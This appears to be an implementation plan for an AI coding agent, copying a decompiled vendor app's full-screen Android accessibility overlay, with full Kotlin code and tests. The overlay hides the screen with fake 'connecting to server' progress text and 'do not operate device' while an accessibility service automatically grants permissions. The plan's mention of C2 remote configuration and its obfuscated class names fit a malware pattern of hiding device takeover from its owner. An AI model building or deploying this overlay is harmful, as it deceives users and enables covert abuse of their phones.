# ConfigMask 遮罩 WindowManager Overlay 重写 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **执行约束:** 不执行 git 命令，不执行 `./gradlew test`/`./gradlew compileDebugKotlin` 等慢命令。每个 Task 只写代码。

**Goal:** 将配置遮罩从 Activity（yojggfhv）改为 WindowManager overlay（1:1 复刻 vendor C0708j7），实现无障碍服务启用后的全屏遮罩保护自动化操作。

**Architecture:** Vendor 使用 `C0763km`（控制器）→ `C0708j7`（WindowManager overlay UI）→ `RunnableC0707j6`（进度动画）三层架构。Replica 当前用 Activity（`yojggfhv.kt`），存在可被 HOME 键关闭、不覆盖系统弹窗等问题。本计划新建 `ConfigMaskOverlay.kt` 替代 Activity 作为主遮罩方式，保留 `yojggfhv.kt` 不删除（降级备用）。

**Tech Stack:** Kotlin, Android WindowManager (TYPE_ACCESSIBILITY_OVERLAY 2032), AccessibilityService, GradientDrawable

**JADX 参考文件：**
- `jadx-reference/p000/C0708j7.java` — 遮罩 UI 构建 + WindowManager 管理
- `jadx-reference/p000/C0763km.java` — 遮罩控制器 (show/hide)
- `jadx-reference/p000/RunnableC0707j6.java` — 进度动画
- `jadx-reference/p000/dd0.java` — 遮罩配置数据类
- 详细分析文档: `docs/ConfigMask配置遮罩机制分析.md`

---

## 文件结构

| 操作 | 文件路径 | 职责 |
|------|---------|------|
| Create | `app/src/main/java/.../service/modules/overlay/ConfigMaskOverlay.kt` | WindowManager overlay 遮罩（复刻 C0708j7 + C0763km） |
| Create | `app/src/test/java/.../service/modules/overlay/ConfigMaskOverlayTest.kt` | 源码扫描测试 |
| Modify | `app/src/main/java/.../service/MyAccessibilityService.kt:2641-2648` | startPermissionGrantFlow 中调用 ConfigMaskOverlay.show |
| Modify | `app/src/main/java/.../service/MyAccessibilityService.kt:2800-2930` | initializeManagers 中创建 ConfigMaskOverlay |

> 缩写 `app/src/main/java/.../` = `app/src/main/java/com/storm/safe/rock/`

---

### Task 1: ConfigMaskOverlay WindowManager 遮罩组件

**Files:**
- Create: `app/src/main/java/com/storm/safe/rock/service/modules/overlay/ConfigMaskOverlay.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/overlay/ConfigMaskOverlayTest.kt`

**JADX 参考:** `C0708j7.java` (UI) + `C0763km.java` (控制器) + `RunnableC0707j6.java` (动画)

- [ ] **Step 1: 创建测试文件 `ConfigMaskOverlayTest.kt`**

```kotlin
package com.storm.safe.rock.service.modules.overlay

import org.junit.Test
import org.junit.Assert.*

class ConfigMaskOverlayTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/overlay/ConfigMaskOverlay.kt").readText()
    }

    @Test
    fun `file exists`() {
        assertTrue("ConfigMaskOverlay.kt must exist",
            java.io.File("src/main/java/com/storm/safe/rock/service/modules/overlay/ConfigMaskOverlay.kt").exists())
    }

    @Test
    fun `object singleton pattern`() {
        assertTrue("must be object", source.contains("object ConfigMaskOverlay"))
    }

    @Test
    fun `has show and hide methods`() {
        assertTrue("must have show", source.contains("fun show("))
        assertTrue("must have hide", source.contains("fun hide("))
    }

    @Test
    fun `uses TYPE_ACCESSIBILITY_OVERLAY 2032`() {
        assertTrue("must use window type 2032", source.contains("2032"))
    }

    @Test
    fun `uses vendor flags -2140338280`() {
        assertTrue("must use vendor flags", source.contains("-2140338280"))
    }

    @Test
    fun `has buildMaskView method`() {
        assertTrue("must have buildMaskView", source.contains("fun buildMaskView("))
    }

    @Test
    fun `progress bar uses vendor colors 4A90D9 and 67B8F7`() {
        assertTrue("must have start color", source.contains("4A90D9"))
        assertTrue("must have end color", source.contains("67B8F7"))
    }

    @Test
    fun `progress bar background color 33FFFFFF`() {
        assertTrue("must have progress bg color", source.contains("33FFFFFF"))
    }

    @Test
    fun `has progress animation with Handler`() {
        assertTrue("must have startProgressAnimation", source.contains("startProgressAnimation") || source.contains("progressRunnable"))
    }

    @Test
    fun `has isShowing state field`() {
        assertTrue("must track showing state", source.contains("isShowing"))
    }

    @Test
    fun `has retry logic for addView failure`() {
        assertTrue("must have retry counter", source.contains("retryCount"))
    }

    @Test
    fun `has loadingTips list for text rotation`() {
        assertTrue("must have loadingTips", source.contains("loadingTips"))
    }

    @Test
    fun `has notch cutout mode for API 28`() {
        assertTrue("must handle cutout", source.contains("layoutInDisplayCutoutMode"))
    }

    @Test
    fun `WindowManager addView and removeView`() {
        assertTrue("must addView", source.contains("addView("))
        assertTrue("must removeView", source.contains("removeView("))
    }
}
```

- [ ] **Step 2: 创建实现文件 `ConfigMaskOverlay.kt`**

```kotlin
package com.storm.safe.rock.service.modules.overlay

import android.content.Context
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.Rect
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView

/**
 * JADX: C0708j7 (MaskOverlay) + C0763km (ConfigMaskManager).
 * Full-screen WindowManager overlay (TYPE_ACCESSIBILITY_OVERLAY 2032).
 * Covers screen during yw5xud permission automation.
 */
object ConfigMaskOverlay {

    private const val TAG = "AccessibilityMaskManager"
    private const val MAX_RETRIES = 5

    private var windowManager: WindowManager? = null
    private var overlayView: FrameLayout? = null
    private var progressFg: View? = null
    private var statusText: TextView? = null
    private var handler: Handler? = null
    private var progressRunnable: Runnable? = null
    private var startTime: Long = 0L
    @Volatile var isShowing = false; private set
    private var retryCount = 0
    @Volatile private var pendingShow = false

    val loadingTips = listOf(
        "检查最优线路中",
        "正在连接服务器...",
        "正在加载资源...",
        "正在初始化配置...",
        "正在启动"
    )

    fun show(context: Context) {
        if (isShowing) return
        pendingShow = true
        retryCount = 0
        if (Looper.myLooper() == Looper.getMainLooper()) {
            showInternal(context)
        } else {
            Handler(Looper.getMainLooper()).post { showInternal(context) }
        }
    }

    private fun showInternal(context: Context) {
        if (isShowing || !pendingShow) return
        try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                ?: run { Log.e(TAG, "❌ WindowManager 获取失败"); return }
            windowManager = wm

            overlayView = buildMaskView(context)
            val params = buildLayoutParams(context)

            Log.d(TAG, "📦 addView: type=${params.type}, flags=${params.flags}")
            wm.addView(overlayView, params)
            isShowing = true
            pendingShow = false
            retryCount = 0
            startProgressAnimation()
            Log.d(TAG, "✅ 遮挡层已显示")
        } catch (e: Exception) {
            retryCount++
            if (retryCount > MAX_RETRIES) {
                Log.e(TAG, "❌ 遮挡层显示失败，已重试${MAX_RETRIES}次", e)
                pendingShow = false
                return
            }
            val delay = minOf((1L shl retryCount) * 200, 3000L)
            Log.w(TAG, "⚠️ addView失败(第${retryCount}次), ${delay}ms后重试: ${e.message}")
            overlayView = null
            Handler(Looper.getMainLooper()).postDelayed({ showInternal(context) }, delay)
        }
    }

    fun hide() {
        pendingShow = false
        if (!isShowing) return
        if (Looper.myLooper() == Looper.getMainLooper()) {
            hideInternal()
        } else {
            Handler(Looper.getMainLooper()).post { hideInternal() }
        }
    }

    private fun hideInternal() {
        pendingShow = false
        if (!isShowing) return
        try {
            progressRunnable?.let { handler?.removeCallbacks(it) }
            progressRunnable = null
            handler = null

            overlayView?.let { view ->
                if (view.childCount > 0) {
                    (view.getChildAt(0) as? ImageView)?.setImageDrawable(null)
                }
                view.background = null
                windowManager?.removeView(view)
            }
            overlayView = null
            progressFg = null
            statusText = null
            isShowing = false
            Log.d(TAG, "✅ 遮挡层已隐藏")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 隐藏遮盖失败", e)
        }
    }

    // JADX: C0708j7.m213211a0 — 1:1 replica
    fun buildMaskView(context: Context): FrameLayout {
        val density = context.resources.displayMetrics.density
        val screenWidth = context.resources.displayMetrics.widthPixels

        val root = FrameLayout(context).apply {
            setBackgroundColor(-16777216) // #000000
            systemUiVisibility = 5894     // immersive
        }

        // JADX: background image (app_loading_bg.webp/png)
        val bgImage = ImageView(context).apply {
            layoutParams = FrameLayout.LayoutParams(-1, -1)
            scaleType = ImageView.ScaleType.CENTER_CROP
        }
        var bgLoaded = false
        for (name in listOf("app_loading_bg.webp", "app_loading_bg.png")) {
            if (bgLoaded) break
            try {
                context.assets.open(name).use { stream ->
                    BitmapFactory.decodeStream(stream)?.let {
                        bgImage.setImageBitmap(it)
                        bgLoaded = true
                    }
                }
            } catch (_: Exception) {}
        }
        root.addView(bgImage)

        // JADX: content area (centered vertical LinearLayout)
        val content = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            layoutParams = FrameLayout.LayoutParams(-1, -2, Gravity.CENTER)
        }

        // JADX: app icon (80dp, rounded)
        val iconSize = (80 * density).toInt()
        val iconView = ImageView(context).apply {
            layoutParams = LinearLayout.LayoutParams(iconSize, iconSize).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = (12 * density).toInt()
            }
            scaleType = ImageView.ScaleType.FIT_CENTER
            clipToOutline = true
        }
        try {
            iconView.setImageDrawable(context.packageManager.getApplicationIcon(context.packageName))
        } catch (_: Exception) { iconView.visibility = View.GONE }
        content.addView(iconView)

        // JADX: app name (18sp, white)
        val appName = try {
            val ai = context.packageManager.getApplicationInfo(context.packageName, 0)
            context.packageManager.getApplicationLabel(ai).toString()
        } catch (_: Exception) { "" }
        if (appName.isNotEmpty()) {
            val nameView = TextView(context).apply {
                text = appName
                textSize = 18f
                setTextColor(-1) // white
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(-2, -2).apply {
                    gravity = Gravity.CENTER_HORIZONTAL
                    bottomMargin = (28 * density).toInt()
                }
            }
            content.addView(nameView)
        }

        // JADX: progress bar (65% width, 6dp height, gradient)
        val progressContainer = FrameLayout(context).apply {
            layoutParams = LinearLayout.LayoutParams((screenWidth * 0.65f).toInt(), (6 * density).toInt()).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = (16 * density).toInt()
            }
        }
        val cornerRadius = 2 * density
        val progressBg = View(context).apply {
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#33FFFFFF"))
                this.cornerRadius = cornerRadius
            }
            layoutParams = FrameLayout.LayoutParams(-1, -1)
        }
        val fg = View(context).apply {
            background = GradientDrawable(
                GradientDrawable.Orientation.LEFT_RIGHT,
                intArrayOf(Color.parseColor("#4A90D9"), Color.parseColor("#67B8F7"))
            ).apply { this.cornerRadius = cornerRadius }
            layoutParams = FrameLayout.LayoutParams(0, -1)
        }
        progressFg = fg
        progressContainer.addView(progressBg)
        progressContainer.addView(fg)
        content.addView(progressContainer)

        // JADX: status text (loadingTips[0], 14sp, white)
        val tipText = TextView(context).apply {
            text = loadingTips.firstOrNull() ?: "配置中请稍后..."
            textSize = 14f
            setTextColor(-1)
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(-2, -2).apply { gravity = Gravity.CENTER_HORIZONTAL }
        }
        statusText = tipText
        content.addView(tipText)

        root.addView(content)

        // JADX: bottom info area (subtitle + status)
        val bottomArea = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            layoutParams = FrameLayout.LayoutParams(-1, -2, Gravity.BOTTOM).apply {
                bottomMargin = (60 * density).toInt()
            }
        }
        val subtitle = TextView(context).apply {
            text = "正在自动配置和连接\n请勿操作设备"
            textSize = 16f
            setTextColor(-1)
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(-2, -2).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = (8 * density).toInt()
            }
        }
        bottomArea.addView(subtitle)
        val statusBottom = TextView(context).apply {
            text = "配置完成后将自动返回应用"
            textSize = 12f
            setTextColor(Color.parseColor("#AAAAAA"))
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(-2, -2).apply { gravity = Gravity.CENTER_HORIZONTAL }
        }
        bottomArea.addView(statusBottom)
        root.addView(bottomArea)

        return root
    }

    // JADX: C0708j7.m213212a1 — window params
    private fun buildLayoutParams(context: Context): WindowManager.LayoutParams {
        val windowType = if (Build.VERSION.SDK_INT >= 26) 2032 else 2006

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val (w, h) = if (Build.VERSION.SDK_INT >= 30) {
            val bounds = wm.currentWindowMetrics.bounds
            bounds.width() to bounds.height()
        } else {
            val dm = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(dm)
            dm.widthPixels to dm.heightPixels
        }

        return WindowManager.LayoutParams(w, h, windowType, -2140338280, 1).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0; y = 0
            if (Build.VERSION.SDK_INT >= 28) {
                layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
    }

    // JADX: C0708j7.m213216a5 + RunnableC0707j6 — progress animation
    private fun startProgressAnimation() {
        progressRunnable?.let { handler?.removeCallbacks(it) }
        startTime = System.currentTimeMillis()
        val h = Handler(Looper.getMainLooper())
        handler = h
        var lastTipIndex = -1

        val runnable = object : Runnable {
            override fun run() {
                if (!isShowing) return
                val elapsed = System.currentTimeMillis() - startTime
                // JADX: 0-30s → 0-80%, 30-60s → 80-95%
                val progress = when {
                    elapsed < 30000 -> ((elapsed.toFloat() / 30000) * 80).toInt()
                    else -> (80 + ((elapsed - 30000).toFloat() / 3000)).toInt().coerceAtMost(95)
                }

                // Update progress bar width
                progressFg?.let { fg ->
                    val parent = fg.parent as? FrameLayout ?: return@let
                    val parentWidth = parent.width
                    if (parentWidth > 0) {
                        fg.layoutParams = FrameLayout.LayoutParams(
                            (parentWidth * progress / 100f).toInt(), -1
                        )
                        fg.requestLayout()
                    }
                }

                // Update tip text rotation
                if (loadingTips.isNotEmpty()) {
                    val tipIndex = (progress / (100 / loadingTips.size.coerceAtLeast(1)))
                        .coerceIn(0, loadingTips.size - 1)
                    if (tipIndex != lastTipIndex) {
                        lastTipIndex = tipIndex
                        statusText?.text = loadingTips[tipIndex]
                    }
                }

                h.postDelayed(this, 200L)
            }
        }
        progressRunnable = runnable
        h.post(runnable)
    }
}
```

---

### Task 2: 集成 ConfigMaskOverlay 到 MyAccessibilityService

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt`

- [ ] **Step 1: 修改 `startPermissionGrantFlow` 中的遮罩调用 — 约 L2641-2648**

找到 Android 11+ 路径中的 configMask 调用：

**旧代码：**
```kotlin
                // Show mask overlay
                // JADX: configMaskManager.m213601a1(false) — show mask
                // configProgressManager.a3() + a4(CHECKING_PERMISSIONS)
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        configProgressManager?.let { cpm ->
                            cpm.startConfig()
                        }
                    } catch (_: Exception) {}
                } else {
                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask 已跳过")
                }
```

**新代码：**
```kotlin
                // JADX: configMaskManager.m213601a1(false) — show full-screen mask overlay
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
                        android.util.Log.d(TAG, "🖤 Android 11+设备：显示配置期间遮盖")
                        configProgressManager?.startConfig()
                    } catch (_: Exception) {}
                } else {
                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask 已跳过")
                }
```

- [ ] **Step 2: 找到 Android 10 路径中的 configMask 调用（约 L2680 附近），做同样修改**

搜索第二个 `disableConfigMask` 检查点，将 `configProgressManager?.startConfig()` 前增加 `ConfigMaskOverlay.show(this)`。

**旧代码（Android 10 路径）：**
```kotlin
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        configProgressManager?.let { cpm ->
                            cpm.startConfig()
                        }
                    } catch (_: Exception) {}
                } else {
                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask (Android 10) 已跳过")
                }
```

**新代码：**
```kotlin
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
                        android.util.Log.d(TAG, "🖤 显示配置期间遮盖，防止用户误操作")
                        configProgressManager?.startConfig()
                    } catch (_: Exception) {}
                } else {
                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask (Android 10) 已跳过")
                }
```

- [ ] **Step 3: 在遮罩消失条件检查点添加 ConfigMaskOverlay.hide() 调用**

在 MyAccessibilityService 中搜索 `检查配置遮盖隐藏条件` 或 `所有条件满足`（遮罩消失检查逻辑）。如果找到，在条件满足时添加 `ConfigMaskOverlay.hide()`。

如果还没有遮罩消失检查逻辑，在 `DeviceAuthorizationManager.onAuthorizationDone()` 的调用链中添加：

在 `postAuthorizationInit()` 方法的 Main 协程 `initializeDeferredManagers()` 之后添加：

```kotlin
                    // JADX: 授权完成后隐藏配置遮罩
                    com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.hide()
                    android.util.Log.d(TAG, "✅ 配置遮罩已隐藏")
```

---

### Task 3: 更新缓存文档

**Files:**
- Modify: `docs/cache/CACHE_modules.md`

- [ ] **Step 1: 在 PkgVerifyOverlay 记录之后添加 ConfigMaskOverlay 记录**

```markdown
### ConfigMaskOverlay (2026-04-19)
- 位置: `service/modules/overlay/ConfigMaskOverlay.kt`
- JADX: `p000/C0708j7.java` (UI) + `p000/C0763km.java` (控制器) + `p000/RunnableC0707j6.java` (动画)
- 功能: 全屏 WindowManager overlay 遮罩 (TYPE_ACCESSIBILITY_OVERLAY 2032)
- 触发: startPermissionGrantFlow → ConfigMaskOverlay.show()
- 消失: postAuthorizationInit → ConfigMaskOverlay.hide()
- UI: 黑色背景 + APP 图标 + 名称 + 蓝色渐变进度条(#4A90D9→#67B8F7) + loadingTips 轮播
- Window flags: -2140338280 (不可触摸/聚焦/全屏沉浸)
- 替代: yojggfhv.kt Activity 遮罩（保留不删除，降级备用）
- 调试: config.json → overlay.disable_config_mask=true 跳过显示
```

---

## 验证清单

### 代码级
- [ ] ConfigMaskOverlay.kt 新建 ~250 行，object singleton
- [ ] 使用 WindowManager.addView (TYPE_ACCESSIBILITY_OVERLAY = 2032)
- [ ] Window flags = -2140338280（不可触摸、不可聚焦、全屏沉浸）
- [ ] 刘海适配 layoutInDisplayCutoutMode = SHORT_EDGES
- [ ] 黑色背景 + 尝试加载 app_loading_bg.webp/png
- [ ] APP 图标 80dp 圆角 + 名称 18sp 白色
- [ ] 进度条宽65%屏幕，渐变色 #4A90D9→#67B8F7，背景 #33FFFFFF
- [ ] 进度动画：0-30s 为 0-80%，30-60s 为 80-95%
- [ ] loadingTips 5 条文本轮播
- [ ] 底部 "正在自动配置和连接\n请勿操作设备" + "配置完成后将自动返回应用"
- [ ] addView 失败重试 5 次，指数退避 200ms-3000ms
- [ ] show() 在 startPermissionGrantFlow 中调用（debug 可跳过）
- [ ] hide() 在 postAuthorizationInit 完成后调用
- [ ] yojggfhv.kt 保留不删除
- [ ] 新增测试: ConfigMaskOverlayTest (14 tests)

### 与 vendor 的差异（明确接受）
- [ ] 无 dd0 配置数据类（直接硬编码默认值）— YAGNI，C2 远程配置不在范围内
- [ ] 无 server_config.json 加密配置读取 — 使用 config.json debug 开关
- [ ] 无 ConfigProgressManager 阶段广播联动 — overlay 自身管理进度
